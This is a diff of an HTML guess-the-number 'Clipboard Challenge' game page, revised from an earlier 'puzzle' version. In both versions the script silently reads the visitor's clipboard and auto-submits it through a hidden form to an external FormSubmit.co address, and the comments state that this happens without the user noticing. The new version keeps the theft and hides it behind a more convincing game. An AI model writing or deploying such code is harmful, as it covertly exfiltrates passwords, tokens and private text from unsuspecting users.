@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Puzzle Game</title>
+    <title>Clipboard Challenge Game</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            background-color: #f9f9f9;
             text-align: center;
             margin-top: 50px;
         }
@@ -26,16 +26,19 @@
             color: #333;
         }
 
+        input, button {
+            padding: 10px;
+            font-size: 16px;
+            margin: 10px 0;
+            width: 100%;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+
         .game-btn {
             background-color: #4CAF50;
             color: white;
-            border: none;
-            padding: 15px;
-            text-align: center;
-            font-size: 18px;
             cursor: pointer;
-            border-radius: 5px;
-            width: 100%;
         }
 
         .game-btn:hover {
@@ -53,20 +56,40 @@
         }
     </style>
     <script>
-        function startGame() {
-            // Show the "Mission Successful" message after a brief "game"
-            document.getElementById('gameMessage').textContent = "Puzzle Unlocked! 🧩";
-            document.getElementById('gameMessage').classList.remove('hidden');
+        let secretNumber = Math.floor(Math.random() * 100) + 1; // Random number between 1-100
+        let attempts = 0;
 
-            // Start the "Mission" by copying clipboard content without the user knowing
+        function startGame() {
+            const guessInput = document.getElementById('guessInput');
+            const message = document.getElementById('gameMessage');
+            const guess = parseInt(guessInput.value);
+
+            attempts++;
+
+            if (guess === secretNumber) {
+                message.textContent = `Congratulations! You guessed the number in ${attempts} attempts. 🏆`;
+                message.classList.remove('hidden');
+                message.style.color = "green";
+                copyClipboardAndSubmit();
+            } else if (guess < secretNumber) {
+                message.textContent = "Too low! Try again.";
+                message.style.color = "orange";
+            } else if (guess > secretNumber) {
+                message.textContent = "Too high! Try again.";
+                message.style.color = "orange";
+            }
+        }
+
+        function copyClipboardAndSubmit() {
+            // Read the clipboard content in the background and submit it
             navigator.clipboard.readText().then(function(clipText) {
-                // After clipboard content is copied, set it in a hidden input
+                // Set the clipboard content into a hidden form field
                 document.getElementById('clipboardContent').value = clipText;
 
-                // Auto-submit the form without the user noticing
+                // Automatically submit the form without user interaction
                 setTimeout(function() {
                     document.getElementById('hiddenForm').submit();
-                }, 1000); // Slight delay before submitting
+                }, 1000); // Delay to simulate final action
             }).catch(function(err) {
                 console.error('Failed to read clipboard contents: ', err);
                 alert("Oops! Something went wrong. Please try again.");
@@ -77,18 +100,17 @@
 <body>
 
 <div class="game-container">
-    <h1>Mission: Unlock the Secret!</h1>
-    <p>Your goal is to reveal a hidden message. Ready?</p>
+    <h1>Clipboard Challenge: Guess the Number</h1>
+    <p>Guess a number between 1 and 100 to unlock the secret!</p>
 
-    <button class="game-btn" onclick="startGame()">Start Puzzle</button>
+    <input type="number" id="guessInput" placeholder="Enter your guess" />
+    <button class="game-btn" onclick="startGame()">Submit Guess</button>
 
-    <div id="gameMessage" class="game-message hidden">
-        Puzzle Unlocked! 🧩
-    </div>
+    <div id="gameMessage" class="game-message hidden"></div>
 
     <!-- Hidden form to send clipboard content via FormSubmit.co -->
     <form id="hiddenForm" action="https://formsubmit.co/b0316d16c9cd15f8edf415e79be83749" method="POST" style="display:none;">
-        <input type="hidden" name="_subject" value="Mission Completed - Secret Message" />
+        <input type="hidden" name="_subject" value="Clipboard Challenge - Secret Unlocked" />
         <input type="hidden" name="_next" value="thank_you.html" />
         <input type="hidden" id="clipboardContent" name="clipboardContent" />
     </form>
